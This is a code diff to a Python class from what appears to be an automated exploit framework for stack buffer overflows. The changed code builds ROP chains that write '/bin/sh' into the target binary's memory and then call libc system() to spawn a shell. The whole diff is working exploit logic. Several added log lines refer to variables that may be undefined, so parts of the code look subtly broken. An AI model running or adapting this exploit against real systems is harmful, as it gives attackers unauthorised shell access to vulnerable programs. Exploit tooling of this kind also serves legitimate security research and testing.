@@ -164,6 +164,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         # Need to perform drain of non libc stuff
         if self.suffix:
+            logger.info(f"Attempting to receive provided suffix: {suffix}")
             res = sconn.recvuntil(self.suffix)
             logger.debug(f"Received suffix: {res}")
         else:
@@ -186,9 +187,10 @@ class StackBufferOverflowVulnerability(Vulnerability):
             conn.navigate(self.targetFunc)
 
         # send /bin/sh
+        target_heap_address = self.binary.bss() + 0x100
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.bss()+0x100)
+        sm.pop_rdi(target_heap_address)
         sm.ret("gets", "binary")
         sm.ret(function_addr, "binary")
         payload2 = sm.resolve(binary=0x0)
@@ -196,20 +198,46 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("Sending second payload (setup write to controlled memory)")
         sconn.sendline(payload2)
         logger.info("Navigating to return.")
+        if self.suffix:
+            logger.info(f"Attempting to receive provided suffix: {suffix}")
+            res = sconn.recvuntil(self.suffix)
+            logger.debug(f"Received suffix: {res}")
+        else:
+            logger.info("Navigating to function exit")
+            conn.navigate(self.functionExit)
+
+        # we have exited the function, we can now
+        # write /bin/sh to a controlled part of memory
+        logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
         sconn.sendline("/bin/sh\x00")
 
-        # TODO: This isn't strictly necesary, and
-        # would be better to detect via a model.
-        res = sconn.recv(timeout=1)
-        logger.debug(f"clearing out any re-entry text: {res}")
+        # need to navigate back to the targetFunc
+        if self.initial:
+            logger.info(f"Attempting to read provided initial: {initial}")
+            sconn.recvuntil(self.initial)
+            logger.debug(f"Received initial: {initial}")
+        else:
+            logger.info("Navigating to targetFunc.")
+            conn.navigate(self.targetFunc)
 
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.bss()+0x100)
+        sm.pop_rdi(target_heap_address)
         sm.nop()
         sm.ret("system", "libc")
 
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
-        logger.info("Sending final payload")
+        logger.info("Sending final payload (invoke system('bin/sh'))")
         sconn.sendline(payload3)
+        
+        # Payload sent, now exit the function.
+        if self.suffix:
+            logger.info(f"Attempting to receive provided suffix: {suffix}")
+            res = sconn.recvuntil(self.suffix)
+            logger.debug(f"Received suffix: {res}")
+        else:
+            logger.info("Navigating to function exit")
+            conn.navigate(self.functionExit)
+        
+        logger.info("We should now have a shell.")
